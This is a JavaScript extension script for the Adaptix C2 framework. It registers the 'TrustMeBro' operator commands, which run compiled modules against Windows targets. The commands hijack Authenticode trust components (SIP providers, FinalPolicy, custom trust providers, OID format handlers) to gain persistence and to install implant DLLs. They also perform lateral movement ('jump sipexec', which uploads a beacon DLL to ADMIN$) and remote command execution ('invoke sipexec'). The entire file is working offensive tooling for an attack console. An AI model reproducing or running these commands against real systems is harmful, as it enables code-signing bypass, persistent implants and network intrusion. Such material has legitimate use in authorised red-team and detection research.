/*
 * tmb.axs - TrustMeBro Adaptix Framework Extension
 *
 * Registers all TrustMeBro BOF commands for Adaptix C2.
 * BOFs are loaded from the bin/ directory relative to this script.
 */

var metadata = {
    name: "TrustMeBro",
    description: "Authenticode signature manipulation BOFs (SIP hijack, FinalPolicy, SigStash, probe)"
};

var bof_dir = ax.script_dir() + "../bin/";

// ---- tmb_probe ----
var cmd_probe = ax.create_command("tmb_probe", "Query local CI enforcement state", "tmb_probe");
cmd_probe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = bof_dir + "tmb_probe.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: CI probe");
});

// ---- tmb_finalpolicy ----
var cmd_fp = ax.create_command("tmb_finalpolicy", "FinalPolicy hijack (SoftpubCleanup)", "tmb_finalpolicy [--clean]");
cmd_fp.addArgBool("--clean", "Restore FinalPolicy to default");
cmd_fp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let bof_params = ax.bof_pack("short", [action]);
    let bof_path = bof_dir + "tmb_finalpolicy.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: FinalPolicy");
});

// ---- tmb_sip_hijack ----
var cmd_sip = ax.create_command("tmb_sip_hijack", "SIP persistence (VerifyIndirectData redirect)", "tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]");
cmd_sip.addArgBool("--clean", "Restore SIP keys to defaults");
cmd_sip.addArgBool("--all-sips", "Target all 17 standard SIPs");
cmd_sip.addArgBool("--sac", "Include Smart App Control SIP");
cmd_sip.addArgFlagString("--sip-types", "sip_types", "Comma-separated aliases", "pe,ps1,msi");
cmd_sip.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let flags = 0;
    if (parsed_json["--all-sips"]) flags |= 1;
    if (parsed_json["--sac"]) flags |= 2;
    let guids = parsed_json["sip_types"] || "pe,ps1,msi";
    let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
    let bof_path = bof_dir + "tmb_sip_hijack.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SIP hijack");
});

// ---- tmb_wow64_hijack ----
var cmd_wow = ax.create_command("tmb_wow64_hijack", "SIP hijack WOW6432Node only (32-bit callers)", "tmb_wow64_hijack [--sip-types pe,ps1] [--clean]");
cmd_wow.addArgBool("--clean", "Restore WOW64 SIP keys");
cmd_wow.addArgBool("--all-sips", "All SIPs");
cmd_wow.addArgBool("--sac", "Smart App Control");
cmd_wow.addArgFlagString("--sip-types", "sip_types", "Aliases", "pe,ps1,msi");
cmd_wow.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let flags = 0;
    if (parsed_json["--all-sips"]) flags |= 1;
    if (parsed_json["--sac"]) flags |= 2;
    let guids = parsed_json["sip_types"] || "pe,ps1,msi";
    let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
    let bof_path = bof_dir + "tmb_wow64_hijack.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: WOW64 SIP hijack");
});

// ---- tmb_custom_provider ----
var cmd_cp = ax.create_command("tmb_custom_provider", "Custom trust provider GUID with SoftpubCleanup", "tmb_custom_provider {GUID} [--clean]");
cmd_cp.addArgString("guid", true);
cmd_cp.addArgBool("--clean", "Remove the custom provider");
cmd_cp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let guid = parsed_json["guid"] || "";
    let bof_params = ax.bof_pack("short,cstr", [action, guid]);
    let bof_path = bof_dir + "tmb_custom_provider.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Custom provider");
});

// ---- tmb_sip_exec ----
var cmd_se = ax.create_command("tmb_sip_exec", "Install payload DLL on SIP execution surface", "tmb_sip_exec --dll C:\\path --guid pe [--clean]");
cmd_se.addArgFlagString("--dll", "dll", "Path to payload DLL", "");
cmd_se.addArgFlagString("--guid", "guid", "GUID alias", "pe");
cmd_se.addArgBool("--clean", "Remove (same as remove)");
cmd_se.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let dll = parsed_json["dll"] || "";
    let guid = parsed_json["guid"] || "pe";

    if (action == 0 && dll.length == 0)
        throw new Error("--dll is required for install.\n\nUsage:\n  tmb_sip_exec --dll C:\\path\\implant.dll --guid pe\n  tmb_sip_exec --clean --guid pe\n\nFor lateral movement, use: jump sipexec / invoke sipexec");

    // Sanity check: DLL path should not contain spaces from stray args
    if (dll.indexOf(" ") !== -1)
        throw new Error("DLL path contains spaces — did you pass extra arguments?\nGot: " + dll + "\n\nThis command only installs a local SIP implant.\nFor remote exec, use: invoke sipexec <target> <command>");

    let bof_params = ax.bof_pack("short,cstr,cstr", [action, dll, guid]);
    let bof_path = bof_dir + "tmb_sip_exec.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SIP exec");
});

// ---- tmb_clean ----
var cmd_clean = ax.create_command("tmb_clean", "Remove all TrustMeBro persistence", "tmb_clean --all");
cmd_clean.addArgBool("--sip", "Restore SIP keys");
cmd_clean.addArgBool("--finalpolicy", "Restore FinalPolicy");
cmd_clean.addArgBool("--all", "Full cleanup");
cmd_clean.addArgFlagString("--custom-provider", "provider", "Custom provider GUID to remove", "");
cmd_clean.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let flags = 0;
    if (parsed_json["--sip"]) flags |= 1;
    if (parsed_json["--finalpolicy"]) flags |= 2;
    if (parsed_json["--all"]) flags |= 4;
    let guid = parsed_json["provider"] || "";
    let bof_params = ax.bof_pack("short,cstr", [flags, guid]);
    let bof_path = bof_dir + "tmb_clean.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Cleanup");
});

// ---- tmb_formatghost ----
var cmd_fg = ax.create_command("tmb_formatghost", "CryptDllFormatObject OID handler (analyst-triggered)", "tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path");
cmd_fg.addArgFlagString("--oid", "oid", "OID to register", "");
cmd_fg.addArgFlagString("--dll", "dll", "Path to handler DLL", "");
cmd_fg.addArgFlagString("--funcname", "func", "Export name", "FormatObject");
cmd_fg.addArgBool("--clean", "Remove the handler");
cmd_fg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let action = parsed_json["--clean"] ? 1 : 0;
    let oid = parsed_json["oid"] || "";
    let dll = parsed_json["dll"] || "";
    let func = parsed_json["func"] || "FormatObject";
    let bof_params = ax.bof_pack("short,cstr,cstr,cstr", [action, oid, dll, func]);
    let bof_path = bof_dir + "tmb_formatghost.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: FormatGhost");
});

// ---- Register ----
var tmb_group = ax.create_commands_group("TrustMeBro", [cmd_probe, cmd_fp, cmd_sip, cmd_wow, cmd_cp, cmd_se, cmd_clean, cmd_fg]);
ax.register_commands_group(tmb_group, ["beacon", "gopher"], ["windows"], []);

// ================================================================
// SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack
// ================================================================

// ---- jump sipexec ----
var _cmd_jump_sipexec = ax.create_command("sipexec", "Lateral movement via WinVerifyTrust FinalPolicy hijack (DLL loads in wmiprvse.exe)", "jump sipexec 192.168.0.1 /tmp/beacon.dll -s ADMIN$ -g default");
_cmd_jump_sipexec.addArgString("target", true);
_cmd_jump_sipexec.addArgFile("dll", true);
_cmd_jump_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
_cmd_jump_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias: default, driver, https", "default");
_cmd_jump_sipexec.addArgFlagString("-f", "func", "$Function export name", "");
_cmd_jump_sipexec.addArgBool("--no-cleanup", "Skip registry restore and file deletion");
_cmd_jump_sipexec.addArgBool("--no-upload", "Skip upload, use --unc path for pre-staged DLL");
_cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let dll_content = parsed_json["dll"];
    let share = parsed_json["share"];
    let guid = parsed_json["guid"];
    let func = parsed_json["func"] || "";
    let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
    let no_upload = parsed_json["--no-upload"] ? 1 : 0;

    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short,short",
        [0, target, "", dll_content, "", share, guid, func, no_cleanup, no_upload]);
    let bof_path = bof_dir + "tmb_sipexec.o";
    let message = `Task: SIPExec jump to ${target} via FinalPolicy hijack`;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});

// ---- invoke sipexec (remote-exec equivalent) ----
var _cmd_invoke_sipexec = ax.create_command("sipexec", "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe", "invoke sipexec 192.168.0.1 /tmp/payload.dll \"whoami /all\" -g default");
_cmd_invoke_sipexec.addArgString("target", true);
_cmd_invoke_sipexec.addArgFile("dll", true);
_cmd_invoke_sipexec.addArgString("cmd", true);
_cmd_invoke_sipexec.addArgFlagString("--unc", "unc_path", "Use existing UNC path instead of uploading DLL (fileless on target)", "");
_cmd_invoke_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
_cmd_invoke_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias", "default");
_cmd_invoke_sipexec.addArgFlagString("-f", "func", "$Function export name", "");
_cmd_invoke_sipexec.addArgBool("--no-cleanup", "Skip cleanup");
_cmd_invoke_sipexec.addArgBool("--no-upload", "Skip upload, use --unc path for pre-staged DLL");
_cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let cmd = parsed_json["cmd"];
    let share = parsed_json["share"];
    let guid = parsed_json["guid"];
    let func = parsed_json["func"] || "";
    let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
    let no_upload = parsed_json["--no-upload"] ? 1 : 0;
    let unc_path = parsed_json["unc_path"] || "";

    let dll_content = parsed_json["dll"];

    // If UNC override, skip upload
    if (unc_path.length > 0) {
        dll_content = "";
        no_upload = 1;
    }

    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short,short",
        [1, target, cmd, dll_content, unc_path, share, guid, func, no_cleanup, no_upload]);
    let bof_path = bof_dir + "tmb_sipexec.o";
    let message = `Task: SIPExec exec on ${target}: ${cmd}`;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});

// ---- Register jump/invoke with sipexec as subcommand ----
var cmd_jump_sipexec = ax.create_command("jump", "Lateral movement via WinVerifyTrust");
cmd_jump_sipexec.addSubCommands([_cmd_jump_sipexec]);

var cmd_invoke_sipexec = ax.create_command("invoke", "Remote execution via WinVerifyTrust");
cmd_invoke_sipexec.addSubCommands([_cmd_invoke_sipexec]);

var tmb_lateral_group = ax.create_commands_group("TrustMeBro-Lateral", [cmd_jump_sipexec, cmd_invoke_sipexec]);
ax.register_commands_group(tmb_lateral_group, ["beacon", "gopher"], ["windows"], []);
